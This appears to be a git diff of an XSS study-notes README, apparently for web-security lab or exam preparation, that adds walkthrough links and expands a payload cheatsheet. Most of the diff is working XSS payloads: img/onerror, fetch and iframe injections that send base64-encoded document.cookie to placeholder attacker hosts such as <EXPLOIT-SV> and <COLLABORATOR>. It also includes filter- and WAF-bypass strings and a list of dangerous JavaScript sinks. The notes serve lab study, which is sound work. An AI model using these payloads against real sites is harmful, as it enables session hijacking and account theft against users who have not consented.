@@ -22,11 +22,14 @@
 ## Walkthrough - Most Important Labs
 
 - [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md) 👀
-
+- [XSS Reflected - how to find tags and attributed blocked and WAF bypass](tags-and-attributed-blockec-waf-bypass.md) 👀
+ 
 - [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
 - [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md)
 - [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md)
-- [4]()
+- [DOM XSS Reflected - eval() + json format without JSON.parse()](dom-xss-reflected-eval-json-escape.md)
+
+
 
 
 ## CHEATSHEET
@@ -80,9 +83,9 @@ javascript:alert(0)
 ```js
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
 
-<img src=0 onerror="new Image().src='http://<IP>/?cookie='+btoa(document.cookie)">
+<img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
 
-<img src=0 onerror="fetch('http://<IP>/?cookie='+btoa(document.cookie))">
+<img src=0 onerror="fetch('https://<IP>/?cookie='+btoa(document.cookie))">
 
 <iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>
 
@@ -90,6 +93,14 @@ javascript:alert(0)
 
 <script>fetch(`https://<BURP-COLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
+
+// tags / atributtes blacklisted
+<iframe
+  src="https://<IP>>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie))>"
+  onload="this.style.width='100px' ">
+</iframe>
+
+
 
 
 // angularJS
@@ -103,10 +114,6 @@ javascript:alert(0)
 // the server scape " with \ so scape with another \ close } and comment with //
 // adapt the payload in the exam depending of the parser
 \"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
-
-
-
-
 
 ```
 
@@ -154,9 +161,6 @@ req2.withCredentials = true;
 req2.send(response);
 ```
 
-
-
-
 #### BYPASS-RESTRICTIONS
 ```js
 // -> escape ' with \
@@ -165,8 +169,12 @@ req2.send(response);
 \\'<script>alert(1)</script>
 // -> escape ' with \ + comment the rest of the js code with //
 \' - alert(1) // 
+${alert(0)}
 // ->  
 </script><script>alert(1)</script>
+http://foo?&apos;-alert(1)-&apos;
+// replace(<>)
+<><img src=1 onerror=alert(1)>  
 
 ```
 
@@ -248,7 +256,7 @@ element.insertAdjacentHTML()
 document.write()
 document.writeln()
 
-eval()
+eval() 
 replace()
 new Function(...)
 setTimeout(string) / setInterval(string) 
